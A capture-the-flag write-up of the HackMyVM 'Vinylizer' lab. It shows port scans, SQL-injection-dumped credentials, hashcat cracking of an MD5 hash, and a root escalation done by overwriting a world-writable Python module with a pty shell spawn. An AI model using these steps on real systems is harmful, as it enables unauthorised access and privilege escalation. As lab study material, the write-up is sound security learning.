---
title: Vinylizer - HackMyVM Writeup
date: 2024-04-11
categories:
  - Writeups
tags:
  - Linux
  - Sql_injection
  - Enumeration
  - PrivEsc
---


# Arp-scan 

 Detecting the ip of the machine

```bash
192.168.0.211 08:00:27:6d:ec:17 PCS Systemtechnik GmbH
```


# Ports

Starting with port scanning by using nmap

```bash
Host is up (0.00100s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)

|_  256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)

80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

|_http-server-header: Apache/2.4.52 (Ubuntu)

|_http-title: Vinyl Records Marketplace

MAC Address: 08:00:27:6D:EC:17 (Oracle VirtualBox virtual NIC)

Device type: general purpose

Running: Linux 4.X|5.X

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5

OS details: Linux 4.15 - 5.8

Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


# Sql_injection

By accessing the website, we can directly see there is 'login.php'

 Let us try with sql injection.

```shell
+----+----------------------------------+-----------+----------------+

| id | password                         | username  | login_attempts |

+----+----------------------------------+-----------+----------------+

| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |

| 2  | password123                      | lana      | 0              |

+----+----------------------------------+-----------+----------------+
```


Then we can use hashcat :

```shell
hashcat -a 0 -m 0 "9432522ed1a8fca612b11c3980a031f6" /usr/share/wordlists/rockyou.txt

9432522ed1a8fca612b11c3980a031f6:addicted2vinyl
```


# Privilege Escalation

By logging with the credential above via ssh :

```shell
shopadmin@vinylizer:/opt$ sudo -l
Matching Defaults entries for shopadmin on vinylizer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User shopadmin may run the following commands on vinylizer:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py

```

By using tools like (linpeas.sh), we are able to find an file with an interesting permission:

```shell
-rwxrwxrwx  1 root root  33229 Apr 11 14:42 random.py
```

```shell
echo "import pty;pty.spawn('/bin/bash')" > /usr/lib/python3.10/random.py
sudo /usr/bin/python3 /opt/vinylizer.py
```

Then we are able to get root permission.

